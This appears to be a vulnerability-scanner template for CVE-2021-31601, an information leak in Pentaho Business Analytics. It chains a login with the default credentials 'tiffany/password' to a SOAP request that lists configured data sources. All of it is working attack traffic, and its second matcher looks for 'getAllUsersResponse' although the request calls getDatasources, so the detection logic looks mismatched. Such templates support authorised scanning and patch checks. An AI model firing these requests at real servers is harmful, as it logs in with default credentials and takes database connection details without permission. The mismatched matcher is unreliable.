id: cve-2021-31601

info:
  name: Pentaho Business Analytics Information Leakage
  author: ProjectDiscoveryAI
  severity: medium
  tags: information-disclosure
  classification:
    cve-id:
      - CVE-2021-31601
    cvss-score: 6.0

variables:
  session_cookie: ""

flow: |
  http(1) && http(2)

http:
  - id: login
    raw:
      - |
        POST /pentaho/j_spring_security_check HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        j_username=tiffany&j_password=password
    extractors:
      - type: regex
        name: session_cookie
        internal: true
        regex:
          - "Set-Cookie: JSESSIONID=(.*?);"
    matchers:
      - type: word
        part: header
        words:
          - "Set-Cookie"
          - "/pentaho/Home"
        condition: and

  - id: datasource-leak
    raw:
      - |
        POST /pentaho/webservices/datasourceMgmtService HTTP/1.1
        Host: {{Hostname}}
        Cookie: JSESSIONID={{session_cookie}}
        Content-Type: text/xml

        <Envelope xmlns="http://schemas.xmlsoap.org/soap/envelope/"><Body><getDatasources xmlns="http://webservices.repository.platform.pentaho.org/"/></Body></Envelope>
    matchers:
      - type: word
        part: body
        words:
          - "getAllUsersResponse"
          - "databaseType"
        condition: and
